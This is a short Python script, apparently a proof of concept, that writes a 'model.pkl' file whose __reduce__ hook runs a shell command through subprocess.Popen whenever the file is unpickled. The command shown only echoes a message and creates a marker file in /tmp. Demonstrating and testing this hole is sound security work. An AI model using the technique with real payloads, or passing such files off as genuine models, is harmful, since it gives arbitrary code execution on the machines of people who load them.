import os
import pickle
import sys
import subprocess

class ModelWrapper:
    def __init__(self, model_data=None):
        self.model_data = model_data
    
    def __reduce__(self):
        return (subprocess.Popen, (('echo "Code execution via pickle" && touch /tmp/pickle_executed',), 0, None, None, None, None, None, None, True))

def create_model_file():
    model = ModelWrapper()
    
    output_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(output_dir, "model.pkl")
    
    with open(output_path, "wb") as f:
        pickle.dump(model, f)
    
    print(f"Model file created: {output_path}")

if __name__ == "__main__":
    create_model_file()
